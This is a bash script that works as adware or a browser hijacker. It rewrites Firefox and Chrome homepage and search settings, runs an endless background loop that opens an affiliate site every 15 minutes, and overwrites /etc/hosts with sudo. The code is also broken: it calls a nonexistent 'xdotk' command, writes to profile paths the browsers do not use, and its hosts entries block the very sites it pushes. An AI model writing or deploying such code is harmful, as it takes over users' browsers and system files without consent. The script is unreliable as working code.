#!/bin/bash

# Function to change browser settings (Home Page, Default Search Engine)
change_browser_settings() {
    # Example for Firefox: Change Home Page and Default Search Engine
    mkdir -p ~/.mozilla/firefox/profiles/Default
    echo 'user_pref("browser.startup.homepage", "http://example.com");' > ~/.mozilla/firefox/profiles/Default/user.js
    echo 'user_pref("browser.search.defaultenginename", "Google");' >> ~/.mozilla/firefox/profiles/Default/user.js
    echo 'user_pref("browser.search.defaultengine", "https://www.google.com/search?q=%s&ie=UTF-8&oe=UTF-8");' >> ~/.mozilla/firefox/profiles/Default/user.js

    # Example for Chromium-based browsers (e.g., Chrome, Edge): Change Home Page and Default Search Engine
    mkdir -p ~/.config/google-chrome/Default
    echo '<title>Homepage</title><base target="_blank"><html><body onload="window.location.href=\''http://example.com'\';" style="background: url(\''http://example.com/background.jpg'\');"></body></html>' > ~/.config/google-chrome/Default/StartPage.html
}

# Function to generate pop-up windows with affiliate websites every few minutes
generate_popup() {
    # Create a background process that opens a new browser window
    while true; do
        xdotk -geometry 800x600+320+150 http://affiliatewebsite.com &
        sleep 900 # Every 15 minutes
    done & 
}

# Function to modify the hosts file for traffic redirection
redirect_traffic() {
    # Create a temporary hosts file with redirect entries
    echo '127.0.0.1 example.com' > /tmp/hosts.tmp
    echo '127.0.0.1 affiliatewebsite.com' >> /tmp/hosts.tmp

    # Replace the original hosts file with the modified one (be careful, this overwrites your original hosts file)
    sudo cp /etc/hosts /etc/hosts.bak 2>/dev/null
    sudo mv /tmp/hosts.tmp /etc/hosts 2>/dev/null
}

# Execute functions in sequence
change_browser_settings
generate_popup
redirect_traffic

